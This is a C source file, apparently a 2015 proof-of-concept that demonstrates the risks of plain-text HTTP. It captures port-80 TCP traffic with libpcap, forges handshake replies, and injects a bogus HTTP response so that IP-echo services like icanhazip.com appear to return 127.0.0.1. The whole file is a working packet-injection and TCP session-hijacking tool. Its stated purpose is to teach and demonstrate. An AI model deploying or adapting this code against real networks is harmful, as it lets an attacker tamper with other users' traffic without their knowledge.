/*
 * This program targets services such as icanhazip.com
 * to show why plain-text HTTP is such as bad idea.
 * Users do something like "curl http://icanhazip.com"
 * and receive back their public IP address.
 * This program hijacks the TCP session and returns
 * a bogus HTTP response hopefully before the actual
 * service responds.
 * Think of all the plain-text services people rely on,
 * for instance DNS and NTP.
 *
 * kontaxis 2015-04-09
 */

#include <stdio.h>
#include <stdint.h>
#include <limits.h>
#include <unistd.h>
#include <string.h>
#include <pcap/pcap.h>
#include <netinet/in.h>

#include <stdlib.h>
#include <signal.h>

#if !__DEBUG__
#define NDEBUG
#endif
/* Assertions test a very specific scenario;
 * capturing IPv4 TCP traffic in ports 80 and 443.
 * I.e., they will fail if a different BPF filter
 * is specified and NDEBUG is undefined
 *  (assertions are enabled). */
#include <assert.h>

/* References:
 *   netinet/ether.h
 *   netinet/ip.h
 *   netinet/tcp.h
 *   netinet/udp.h
 */

/* Ethernet */

#define ETH_ALEN 6

struct ether_header
{
  uint8_t  ether_dhost[ETH_ALEN];
  uint8_t  ether_shost[ETH_ALEN];
  uint16_t ether_type;
} __attribute__ ((__packed__));

#define ETHERTYPE_IP 0x0800 /* IP */

#define SIZE_ETHERNET sizeof(struct ether_header)

/* IP */

struct my_iphdr
{
  uint8_t  vhl;
#define IP_HL(ip) (((ip)->vhl) & 0x0F)
#define IP_V(ip)  (((ip)->vhl) >> 4)
  uint8_t  tos;
  uint16_t tot_len;
  uint16_t id;
  uint16_t frag_off;
  uint8_t  ttl;
  uint8_t  protocol;
  uint16_t check;
  uint32_t saddr;
  uint32_t daddr;
  /*The options start here. */
} __attribute__ ((__packed__));

#define MIN_SIZE_IP (sizeof(struct my_iphdr))
#define MAX_SIZE_IP (0xF * sizeof(uint32_t))

#define IPVERSION 4

/* TCP */

struct my_tcphdr
{
  uint16_t source;
  uint16_t dest;
  uint32_t seq;
  uint32_t ack_seq;
  uint8_t  res1doff;
#define TCP_OFF(th)      (((th)->res1doff & 0xF0) >> 4)
	uint8_t  flags;
#define TCP_FIN  (0x1 << 0)
#define TCP_SYN  (0x1 << 1)
#define TCP_RST  (0x1 << 2)
#define TCP_PUSH (0x1 << 3)
#define TCP_ACK  (0x1 << 4)
#define TCP_URG  (0x1 << 5)
#define TCP_ECE  (0x1 << 6)
#define TCP_CWR  (0x1 << 7)
  uint16_t window;
  uint16_t check;
  uint16_t urg_ptr;
} __attribute__ ((__packed__));

#define MIN_SIZE_TCP (sizeof(struct my_tcphdr))
#define MAX_SIZE_TCP (0xF * sizeof(uint32_t))

#define TCP_PAYLOAD_LEN(ip,tcp) (ntohs(ip->tot_len) \
	- (IP_HL(ip) * sizeof(uint32_t)) - (TCP_OFF(tcp) * sizeof(uint32_t)))

struct my_pseudo_tcphdr
{
	uint32_t ip_source;
	uint32_t ip_dest;
	uint8_t zero;
	uint8_t protocol;
	uint16_t length;
} __attribute__ ((__packed__));


#define SWAP(x,y) \
{                 \
	y = y ^ x;      \
	x = y ^ x;      \
	y = y ^ x;      \
}

#define SWAP_ETHADDR(x)                     \
{                                           \
SWAP(x->ether_shost[0], x->ether_dhost[0]); \
SWAP(x->ether_shost[1], x->ether_dhost[1]); \
SWAP(x->ether_shost[2], x->ether_dhost[2]); \
SWAP(x->ether_shost[3], x->ether_dhost[3]); \
SWAP(x->ether_shost[4], x->ether_dhost[4]); \
SWAP(x->ether_shost[5], x->ether_dhost[5]); \
}

#define SWAP_IPHADDR(x) SWAP(x->saddr, x->daddr)

#define SWAP_TCPADDR(x) SWAP(x->source, x->dest)


#define likely(x)       __builtin_expect((x),1)
#define unlikely(x)     __builtin_expect((x),0)

/* Compute the Internet Checksum for "count" bytes beginning at location "buf".
 * Reference: RFC 1701 4.1
 */
unsigned short checksum(size_t buf, unsigned short count)
{
	register long sum = 0;

	unsigned short *addr = (unsigned short *) buf;

	while (count > 1) {
		sum += *addr++;
		count -= 2;
	}

	/* Add left-over byte, if any.
	 *
	 * When [a,b] is a 16-bit integer a*256+b, where a and b are bytes,
	 * and there is an odd sequence of bytes the odd byte becomes the MSB
	 * of a new 16-bit integer using a null byte for its LSB.
	 *
	 * [A,B] +' [C,D] +' ... +' [Y,Z]              [1]: Even count of bytes
	 * [A,B] +' [C,D] +' ... +' [Z,0]              [2]: Odd  count of bytes
	 */
	if (count > 0)
		sum += htons(* (unsigned char *) addr << 8);

	/* Fold 32-bit sum to 16 bits */
	while (sum >> 16)
		sum = (sum & 0xFFFF) + (sum >> 16);

	return ~sum;
}


pcap_t *pcap_handle;
pcap_t *pcap_handle_inject;

void my_pcap_handler (uint8_t *user, const struct pcap_pkthdr *header,
	const uint8_t *packet)
{
	int r;

	struct ether_header * ether;
	struct my_iphdr     * ip;
	struct my_tcphdr    * tcp;

	char buffer[65535];
	struct my_pseudo_tcphdr pseudo_tcp;
	char *tcp_payload;

	/* Process ethernet header */
	assert(header->caplen >= SIZE_ETHERNET);
	ether = (struct ether_header *) packet;
	if (unlikely(ether->ether_type != htons(ETHERTYPE_IP))) {
		return;
	}

	/* Process IP header */
	assert(header->caplen >= SIZE_ETHERNET + MIN_SIZE_IP);
	ip = (struct my_iphdr *) (packet + SIZE_ETHERNET);
	if (unlikely(IP_V(ip) != IPVERSION)) {
		return;
	}

	switch(ip->protocol) {
		case IPPROTO_TCP: {
			/* Process TCP header */
			assert(header->caplen >= SIZE_ETHERNET + (IP_HL(ip) * sizeof(uint32_t)) +
				MIN_SIZE_TCP);
			tcp = (struct my_tcphdr *) (packet + SIZE_ETHERNET +
				(IP_HL(ip) * sizeof(uint32_t)));

#if __DEBUG__
			fprintf(stdout, "%u.%u.%u.%u:%u -> %u.%u.%u.%u:[%u] ",
				*(((uint8_t *)&(ip->saddr)) + 0),
				*(((uint8_t *)&(ip->saddr)) + 1),
				*(((uint8_t *)&(ip->saddr)) + 2),
				*(((uint8_t *)&(ip->saddr)) + 3),
				ntohs(tcp->source),
				*(((uint8_t *)&(ip->daddr)) + 0),
				*(((uint8_t *)&(ip->daddr)) + 1),
				*(((uint8_t *)&(ip->daddr)) + 2),
				*(((uint8_t *)&(ip->daddr)) + 3),
				ntohs(tcp->dest));
#endif

			/* Swap ethernet addresses */
			SWAP_ETHADDR(ether)
			/* Swap IP addresses */
			SWAP_IPHADDR(ip)
			/* Swap TCP ports */
			SWAP_TCPADDR(tcp)

			SWAP(tcp->seq, tcp->ack_seq);

			tcp_payload = (char *)tcp + (TCP_OFF(tcp) * sizeof(uint32_t));

			/* Prepare the pseudo header used in TCP checksum calculation */
			pseudo_tcp.ip_source = ip->saddr;
			pseudo_tcp.ip_dest   = ip->daddr;
			pseudo_tcp.zero   = 0;
			pseudo_tcp.protocol = ip->protocol;
			pseudo_tcp.length = htons(TCP_OFF(tcp) * sizeof(uint32_t));

			switch(tcp->flags) {
				case TCP_SYN:
#if __DEBUG__
					fprintf(stdout, "S\n");
#endif
					tcp->flags |= TCP_ACK;
					tcp->ack_seq = htonl(ntohl(tcp->ack_seq) + 1);
					break;
				case TCP_ACK:
#if __DEBUG__
					fprintf(stdout, "A\n");
#endif
					/* Do nothing */
					return;
					break;
				case TCP_PUSH | TCP_ACK: {
#if __DEBUG__
					fprintf(stdout, "PA Injection\n");
#endif

					/* Acknowledge any TCP payload in the captured packet */
					tcp->ack_seq = htonl(ntohl(tcp->ack_seq) + TCP_PAYLOAD_LEN(ip,tcp));

					char *injection = "HTTP/1.1 200 OK\n"
						"Content-Type: text/plain\n"
						"Content-Length: 10\n\n"
						"127.0.0.1\n";
					tcp_payload = injection;

					pseudo_tcp.length = htons(TCP_OFF(tcp) * sizeof(uint32_t) +
						strlen(injection));

					ip->tot_len = htons((IP_HL(ip) * sizeof(uint32_t)) +
						(TCP_OFF(tcp) * sizeof(uint32_t)) + strlen(injection));
				}
					break;
				case TCP_FIN:
					tcp->flags |= TCP_ACK;
					/* Fall through */
				case TCP_FIN | TCP_ACK:
#if __DEBUG__
					fprintf(stdout, "FA\n");
#endif
					tcp->ack_seq = htonl(ntohl(tcp->ack_seq) + 1);
					break;
				default:
#if __DEBUG__
					fprintf(stdout, "unknown flags 0x%x\n", tcp->flags);
#else
					fprintf(stderr, "unknown flags 0x%x\n", tcp->flags);
#endif
					return;
					break;
			}

			/* Calculate the TCP checksum */
			tcp->check = 0;

			memcpy(buffer, (char *) &pseudo_tcp, sizeof(struct my_pseudo_tcphdr));

			memcpy(buffer + sizeof(struct my_pseudo_tcphdr), (char *) tcp,
				TCP_OFF(tcp) * sizeof(uint32_t));

			memcpy(buffer + sizeof(struct my_pseudo_tcphdr) +
				(TCP_OFF(tcp) * sizeof(uint32_t)),
				(char *) tcp_payload, TCP_PAYLOAD_LEN(ip,tcp));

			tcp->check = checksum((size_t) buffer, sizeof(struct my_pseudo_tcphdr) +
				ntohs(pseudo_tcp.length));

			/* Calculate the IP checksum */
			ip->check = 0;
			ip->check = checksum((size_t) ip, sizeof(struct my_iphdr));

			/* Assemble the ethernet packet to be injected */
			memcpy(buffer, ether, sizeof(struct ether_header) +
				(IP_HL(ip) * sizeof(uint32_t)) + (TCP_OFF(tcp) * sizeof(uint32_t)));

			memcpy(buffer + sizeof(struct ether_header) +
				(IP_HL(ip) * sizeof(uint32_t)) + (TCP_OFF(tcp) * sizeof(uint32_t)),
				tcp_payload, TCP_PAYLOAD_LEN(ip,tcp));

			/* Dry run? */
			if (unlikely(!pcap_handle_inject)) {
				return;
			}

			if ((r = pcap_inject(pcap_handle_inject, buffer,
				sizeof(struct ether_header) + ntohs(ip->tot_len))) == -1) {
				pcap_perror(pcap_handle_inject, "pcap_inject");
				return;
			}
		}
			break;
		default:
			break;
	}
}


void signal_handler (int signum)
{
	switch(signum) {
		case SIGTERM:
		case SIGINT:
			fprintf(stdout, "\n");
			pcap_breakloop(pcap_handle);
			break;
		default:
			break;
	}
}


#define SNAPLEN 65535
#define PROMISCUOUS ((opt_flags & OPT_PROMISCUOUS) == OPT_PROMISCUOUS)
#define PCAP_TIMEOUT 1 // ms

#define BPF bpf_s
#define BPF_DEFAULT "tcp and dst port 80"
#define BPF_OPTIMIZE 1

int main (int argc, char *argv[])
{
	char * device;
	char * o_device;
	char errbuf[PCAP_ERRBUF_SIZE];

	char * bpf_s;
	struct bpf_program bpf;

	struct sigaction act;

	int i;
#define OPT_DEVICE      (0x1 << 0)
#define OPT_PROMISCUOUS (0x1 << 1)
#define OPT_BPF         (0x1 << 2)
#define OPT_ODEVICE     (0x1 << 3)
	uint8_t opt_flags;

	opt_flags = 0;
	memset(errbuf, 0, PCAP_ERRBUF_SIZE);

	while ((i = getopt(argc, argv, "hvf:pi:o:")) != -1) {
		switch(i) {
			case 'h':
				fprintf(stderr,
					"Use: %s [-h] [-v] [-f bpf] [-p] -i interface -o interface\n",
					argv[0]);
				return -1;
				break;
			case 'v':
				fprintf(stderr, "Build:\t%s\t%s\n", __DATE__, __TIME__);
				return -1;
				break;
			case 'f':
				bpf_s = optarg;
				opt_flags |= OPT_BPF;
				break;
			case 'p':
				opt_flags |= OPT_PROMISCUOUS;
				break;
			case 'i':
				device = optarg;
				opt_flags |= OPT_DEVICE;
				break;
			case 'o':
				o_device = optarg;
				opt_flags |= OPT_ODEVICE;
			default:
				break;
		}
	}

	if (!(opt_flags & OPT_DEVICE)) {
		fprintf(stderr, "[FATAL] Missing target interface. Try with -h.\n");
		return -1;
	}

	if (!(opt_flags & OPT_ODEVICE)) {
		fprintf(stderr, "[FATAL] Missing injection interface. Try with -h.\n");
		return -1;
	}

	fprintf(stdout, "[*] PID: %u\n", getpid());

	if (!(opt_flags & OPT_BPF)) {
		opt_flags |= OPT_BPF;
		bpf_s = BPF_DEFAULT;
	}

	fprintf(stdout, "[*] BPF: '\033[1;32m%s\033[0m'\n", bpf_s);

	fprintf(stdout, "[*] Device: '%s'\n", device);

	if (opt_flags & OPT_ODEVICE) {
		fprintf(stdout, "[*] ODevice: '%s'\n", o_device);
	}

	fprintf(stdout, "[*] Promiscuous: %s%d\033[0m\n",
		(PROMISCUOUS?"\033[1;32m":"\033[1;31m"), PROMISCUOUS);

	if (!(pcap_handle =
		pcap_open_live(device, SNAPLEN, PROMISCUOUS, PCAP_TIMEOUT, errbuf))) {
		fprintf(stderr, "[FATAL] %s\n", errbuf);
		return -1;
	}

	if (opt_flags & OPT_BPF) {
		if (pcap_compile(pcap_handle, &bpf, BPF, BPF_OPTIMIZE,
			PCAP_NETMASK_UNKNOWN) == -1) {
			fprintf(stderr, "[FATAL] Couldn't parse filter. %s\n",
				pcap_geterr(pcap_handle));
			pcap_close(pcap_handle);
			return -1;
		}

		if (pcap_setfilter(pcap_handle, &bpf) == -1) {
			fprintf(stderr, "[FATAL] Couldn't install filter. %s\n",
				pcap_geterr(pcap_handle));
			pcap_close(pcap_handle);
			return -1;
		}

		pcap_freecode(&bpf);
	}

	if (opt_flags & OPT_ODEVICE) {
		if (!(pcap_handle_inject =
			pcap_open_live(o_device, SNAPLEN, 0, PCAP_TIMEOUT, errbuf))) {
			fprintf(stderr, "[FATAL] %s\n", errbuf);
			return -1;
		}
	} else {
		pcap_handle_inject = NULL; /* Dry run? */
	}

	act.sa_handler = signal_handler;
	sigemptyset (&act.sa_mask);
	act.sa_flags = 0;

	if (sigaction(SIGINT, &act, NULL)) {
		perror("sigaction");
		fprintf(stderr,
			"[WARNING] Failed to set signal handler for SIGINT.\n");
	}

	if (sigaction(SIGTERM, &act, NULL)) {
		perror("sigaction");
		fprintf(stderr,
			"[WARNING] Failed to set signal handler for SIGTERM.\n");
	}

	if (pcap_loop(pcap_handle, -1, &my_pcap_handler, NULL) == -1) {
		fprintf(stderr, "[FATAL] pcap_loop failed. %s\n",
			pcap_geterr(pcap_handle));
	}

	pcap_close(pcap_handle);

	if (pcap_handle_inject) {
		pcap_close(pcap_handle_inject);
	}

	return 0;
}
